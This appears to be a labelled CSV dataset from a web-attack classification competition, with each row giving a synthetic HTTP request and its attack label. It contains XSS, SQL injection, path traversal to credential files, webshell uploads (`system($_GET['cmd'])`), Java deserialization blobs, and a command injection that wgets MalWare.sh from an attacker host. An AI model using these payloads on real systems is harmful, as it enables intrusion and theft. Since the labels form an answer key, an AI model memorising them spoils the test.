row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
4529,2025-10-28 01:01:52,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.246.16.4,10.10.159.189,/profile,q=<img src=x onerror=alert(565)>,XSS跨站脚本攻击,XSS跨站脚本攻击
6239,2025-10-23 11:15:07,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.252.156.147,10.245.97.2,/services&random=4498&random=4498,page=3&li+mit=10&so+rt=name&c+ache=fals+e,正常访问,正常访问
5271,2025-11-09 15:31:40,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.64.105,10.187.53.88,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==588",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
8470,2025-11-11 11:06:28,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.252.225.7,10.187.20.134,/BloG,,正常访问,正常访问
8379,2025-10-22 01:39:32,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.88.44,10.187.20.132,/api/data,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzd+GVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9Ma+mF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYm+plY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==225",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10401,2025-10-23 06:36:01,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.19.209,10.253.177.28,/include?page=zip://malicious489.zip#shell.php,,文件包含攻击,文件包含攻击
3066,2025-11-15 23:36:43,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.252.225.7,10.187.20.132,/profile/avatar,"------WebKitFormBoundary929244
Content-Disposition: form-data; name=""upload""; filename=""webshell233.asp""
Content-Type: application/octet-stream

<% eval request(""cmd"") %>
------WebKitFormBoundary849796--",文件上传攻击,文件上传攻击
5286,2025-10-29 13:42:26,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.212,/StAtIC,resOuRce=../../.enV164,目录遍历攻击,目录遍历攻击
2301,2025-10-21 10:26:53,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.25.28,10.251.10.246,/api/execute?domain=test734.com&&whoami,,远程命令执行攻击,远程命令执行攻击
9069,2025-10-31 09:10:08,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.108.26,10.60.33.18,/change-password,setting=disable_security&value=true,CSRF攻击,CSRF攻击
5980,2025-10-20 21:00:21,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,192.168.10.7,10.251.96.250,/LOgiN/660&test=912&timestamp=1763348119&cache=false,,正常访问,正常访问
857,2025-10-31 18:12:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.25.73.35,10.168.2.39,/update-profile&debug=1&random=42&random=42,target_user%3Dadministrator%26permission%3Dadmin&random=330&test=1&debug=1,CSRF攻击,CSRF攻击
9917,2025-11-15 14:27:19,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.189.55,10.10.130.86,/fiLE&cache=true,Load%3D../../..+/WEB-INF/WEB.xm+L90&random=4074,目录遍历攻击,目录遍历攻击
6473,2025-11-02 15:58:37,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.252.168.242,10.16.210.9,/api/orders,,正常访问,正常访问
6263,2025-10-21 03:49:41,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.210.69.199,10.210.184.42,/theme?page=http://malicious306.com/shell.txt,,文件包含攻击,文件包含攻击
1744,2025-11-01 20:33:23,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.187.69.141,10.253.58.75,/api/users?product=262'; WAITFOR DELAY '00:00:01'--,,SQL注入攻击,SQL注入攻击
1525,2025-11-07 14:56:10,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.251.204.99,10.210.184.39,/contact/744,,正常访问,正常访问
608,2025-11-03 09:56:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.189.55,10.153.177.28,/api/ping&test=1&random=853&test=1,host%3D127.0.0.1;%20type%20C:\Windows\win.ini&test=1&random=577,远程命令执行攻击,远程命令执行攻击
4368,2025-10-27 08:55:20,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/include,include=php://filter/resource=/etc/passwd331,文件包含攻击,文件包含攻击
7674,2025-11-07 19:06:17,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.252.186.135,10.252.22.251,/documents/upload,"------WebKitFormBoundary84460
Content-Disposition: form-data; name=""file""; filename=""shell125.php""
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary152945--",文件上传攻击,文件上传攻击
322,2025-11-12 03:02:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.25.130.249,10.18.20.133,/dAshboarD&timestamp=1762948282,,正常访问,正常访问
10525,2025-10-23 07:59:35,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/upload,"------WebKitFormBoundary497654
Content-Disposition: form-data; name=""file""; filename=""shell564.php.jpg""
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary611852--",文件上传攻击,文件上传攻击
10379,2025-11-07 03:26:10,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.24.190,10.204.0.25,/api/restore,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==690",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
3569,2025-11-08 15:41:02,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.187.19.210,10.253.177.28,/api/users?sort%3Dname&debug=1,,正常访问,正常访问
5320,2025-11-16 08:10:31,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.187.19.206,10.253.177.28,/view?load=../../../WEB-INF/web.xml331,,目录遍历攻击,目录遍历攻击
8194,2025-11-08 08:31:35,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.246.32.199,10.244.155.153,/delete-account,redirect_url=http://malicious578.com&token=bypass,CSRF攻击,CSRF攻击
3928,2025-11-13 11:10:10,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.5.248,10.251.227.54,/upload,"------WebKitFormBoundary227517
Content-Disposition: form-data; name=""file""; filename=""shell59.php""
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary767053--",文件上传攻击,文件上传攻击
1921,2025-11-14 20:27:51,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.244.82.103,10.252.133.241,/home,,正常访问,正常访问
972,2025-10-27 00:46:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.25.189.55,10.153.177.28,/api/download?filename=../../../../etc/hosts,,目录遍历攻击,目录遍历攻击
8971,2025-11-09 01:12:02,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.110.38,10.187.76.76,/sEarCH?aDdRess%3D127.0.0.1622;%20ls%20-lA,,远程命令执行攻击,远程命令执行攻击
1922,2025-11-16 17:03:54,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.244.82.103,10.10.159.189,/assets,page=../../../etc/shadow893,目录遍历攻击,目录遍历攻击
3860,2025-11-12 23:01:12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/search?content=<iframe src=javascript:alert(803)>,,XSS跨站脚本攻击,XSS跨站脚本攻击
4498,2025-10-22 10:40:41,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.248.196.177,10.244.155.144,/search,"{""name"":""User3473"",""email"":""user1792@example.com"",""message"":""Hello""}",正常访问,正常访问
7093,2025-10-28 00:53:27,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.69.67,10.252.110.85,/api/transfer,action=delete+&confirm=true,CSRF攻击,CSRF攻击
627,2025-10-19 10:26:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.10.130.17,10.18.76.33,/asSEts&test=1&timestamp=1762948282&random=416,fiLE=../../../../etC/PaSsWd&cache=false,目录遍历攻击,目录遍历攻击
5577,2025-10-25 21:50:51,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.10.226,10.251.99.251,/contact?q=search,,正常访问,正常访问
201,2025-10-24 00:03:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.25.189.55,10.153.177.26,/api/chanGE-PaSswoRD,ACtIoN%3DdELetE%26COnfiRM%3dTrue,CSRF攻击,CSRF攻击
8047,2025-10-31 04:50:12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.210.67.224,10.244.155.172,/temPlatE?temPLATe=../../../../etC/PASswd769%00,,文件包含攻击,文件包含攻击
10607,2025-11-05 21:39:54,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.213,/ProCesS&test=767,"rO0ABxNYaBFqYxZHlnV0AwWuSGFZAFNlDJYgou83gM6GAgaBrgAKBG9HZEzhy3rvcKKACxROcmVZAG9sZhhWp0aaAAAaAAx3CAaAAbaaAAAHdaAKaMF2Ys51DGlsLnNYaBFqYxZhLmxhBmcuUnVuDGLTzQaAAAAAAaAAAAAABXZyABBQyxZhLmxhbMCUU3lZDGVTAaAAAAAAAAAAAaBJKWN1cNjlbnrUaW1lTWlsBgLZsmf2YQBab3JnlMfwYWNoZS5Jb21tb25ZLMnvBGxly3Rp
b25ZMS5Db25zdgFude1hcAAAaAAAAAABWaCiAAVtyxB0AA9Mamf2yS91dGLsL01HcDt4cHCIAAAAqAA+AaAJzcGaRaMF2yS5SYW5nlKLuDGVnZXiS4qcK94ghOAIaAUkABXzHBhVLEHIAEGphdmEUbgFuZY5odW1izXKGrJUDc5TgiwIaAHhwaAAaAXNyaBRQYXZHLnv0awwuSGfZaE1hCaUh2sHDfmDPAWADsQAkbG9hZEZhY3RvckkaCXROcmVZag9sZHhWP0aAAAAaaAb3CAAAaBAAAAAHdAAJbxlpYMplY3R0AaJbQNNyaBdqYxZhLmxhbmcuU3RYaW5n063kKLJQYr4CAAFAAaV2yWX1ZXHYAbBQYXZHlmxhBmcUt2jqzWn0AAAaaaAaaAAAaaB4ChqABhRlc3r0AAr0CnvLea==375&test=14+7",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
715,2025-11-07 12:17:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.25.189.55,10.153.177.26,/prOdUCts?Sort%3DNAME&debug=1&debug=1&random=894,,正常访问,正常访问
7650,2025-11-14 23:56:14,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.210.108.26,10.60.33.18,/pRofILE/aVatAr&random=6502&timestamp=1763342788&test=837,"------WeBkitFormBoundary772678
ContEnt-DisposITIOn:%20fOrM-dAtA;%20NAm+E%3D%22upLoaD%22;%20filenAme%3d%22WebsHELl935.asp%22
cONTent-TyPe:%20a+pplICatIon/oCTET-strEam

%3C%%20eVAl%20reqUeST(%22cMd%22)%20%%3E
---+---WeBKiTFOrmBOuNDArY456233--&cache=true&cache=true&timestamp=176334746+9",文件上传攻击,文件上传攻击
6785,2025-10-21 01:16:21,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.253.92.7,10.10.228.197,/api/file,content=../../../.git/config244,目录遍历攻击,目录遍历攻击
3667,2025-11-16 19:19:30,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.12.95,10.251.227.34,/api/download,filepath=../../../application815.yml,目录遍历攻击,目录遍历攻击
3174,2025-11-13 23:56:06,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.11.68,10.110.210.160,/api/data,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==529",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
9273,2025-11-15 07:42:57,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.250.222,10.10.130.86,/api/restore,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==960",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
2721,2025-10-19 06:45:08,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.245.76.184,10.10.159.189,/update-profile&timestamp=1763341230&cache=true,recipient%3Dattacker745%26sum%3D6914&debug=0,CSRF攻击,CSRF攻击
5692,2025-10-19 13:46:43,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.64.105,10.187.53.88,/settings,comment=This is a great product 6812,正常访问,正常访问
1644,2025-10-30 07:38:30,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.187.75.85,10.187.69.6,/api/exeCute,Q=hEllO263|c'a+'t /etC/pAssWd,远程命令执行攻击,远程命令执行攻击
2457,2025-11-11 23:25:07,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.168,/update-profile,redirect_url=http://malicious187.com&token=bypass,CSRF攻击,CSRF攻击
1551,2025-11-15 11:00:42,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.251.204.99,10.210.184.39,/aPI/execuTE?ServEr%3dloCalhost678;%20wget%20hTtP://aTtaCker773.cOM/MalWare.sH,,远程命令执行攻击,远程命令执行攻击
8652,2025-11-06 15:41:48,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.5.44,10.244.155.148,/upload,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==695",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10076,2025-10-28 19:44:02,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.108.208.231,10.253.176.211,/meSsage&timestamp=1763341018&debug=0,commeNt=<sCRiPT>AlerT('xSS925')</ScriPt>&random=4416&cache=true&cache=true,XSS跨站脚本攻击,XSS跨站脚本攻击
8447,2025-10-18 16:11:01,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.210.22.248,10.10.110.143,/profile,"message=<iframe src=""javascript:alert&#x28;464&#x29;"">",XSS跨站脚本攻击,XSS跨站脚本攻击
6156,2025-10-20 02:08:19,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,192.168.10.25,10.244.207.16,/api/orders,"{""username"":""user5209"",""password"":""secret6991""}",正常访问,正常访问
646,2025-11-10 13:04:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.25.73.35,10.60.33.18,/execute&cache=false,address%3D127.0.0.1;%20$(ls%20-la)&test=1&cache=false,远程命令执行攻击,远程命令执行攻击
1295,2025-10-26 17:27:26,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/products&random=3337&random=3337&debug=1,"{%22username%22:%22user5514%2+2,%22password%22:%22secret405+8%22}&debug=0&test=969&debug=+0",正常访问,正常访问
7556,2025-10-30 20:28:39,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.208.116.216,10.208.54.30,/api/transfer,target_user=administrator&permission=admin,CSRF攻击,CSRF攻击
6395,2025-11-12 11:59:29,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.22.206,10.253.10.250,/profile?comment=<ScRiPt>alert('XSS384')</ScRiPt>,,XSS跨站脚本攻击,XSS跨站脚本攻击
3187,2025-11-16 03:15:48,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,192.168.21.37,10.251.98.17,/services,,正常访问,正常访问
9366,2025-11-14 07:43:42,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.22.249,10.10.110.143,/process,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==242",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6757,2025-10-28 15:42:17,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.4.177,10.251.212.73,/api/message,message=<body onload=alert('XSS515')>,XSS跨站脚本攻击,XSS跨站脚本攻击
1414,2025-10-24 04:23:50,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/run?address=127.0.0.1100; $(ls -la),,远程命令执行攻击,远程命令执行攻击
10600,2025-10-21 16:03:12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.108.208.231,10.253.251.82,/api/download,resource=../../.env449,目录遍历攻击,目录遍历攻击
1304,2025-10-23 18:21:57,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.7.21,10.240.84.20,/comment,q=<img s+rc=x one+rror=ale+rt(515)>,XSS跨站脚本攻击,XSS跨站脚本攻击
7770,2025-10-22 18:56:43,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.25.14.28,192.168.3.66,/api/page,include=php://filter/resource=/etc/passwd652,文件包含攻击,文件包含攻击
6304,2025-11-12 04:56:23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.4.87,10.251.227.30,/Users&timestamp=1763341327&debug=1&random=6559,"id=421 ANd IF((sELECT u+seR()),SLEEp(1),0)&debu+g=0&debug=0&random=7441",SQL注入攻击,SQL注入攻击
5568,2025-10-18 16:04:51,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.244.38.115,10.210.184.42,/about,page%3D83%26limit%+3D10%26sort%3Dname,正常访问,正常访问
5418,2025-11-07 01:22:35,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.248.21.113,10.210.184.41,/search,"username=admin524' AND (SELECT SUBSTRING(password,6,1) FROM users WHERE username='admin')='a",SQL注入攻击,SQL注入攻击
1179,2025-11-09 19:40:46,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.11.75,10.253.224.246,/post,content=<iframe src=javascript:alert(237)>,XSS跨站脚本攻击,XSS跨站脚本攻击
5368,2025-11-05 03:41:06,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.245.173.153,10.210.184.41,/ProDUcTS,"{%22NamE%22:%22USEr5584+%22,%22EMAIl%22:%22USer+5898@ExaMple.com%22,%22+MESsagE%22:%22HEllO%22}",正常访问,正常访问
3303,2025-11-07 16:55:12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.187.19.217,10.253.177.27,/admin,id=625 OR 1=1,SQL注入攻击,SQL注入攻击
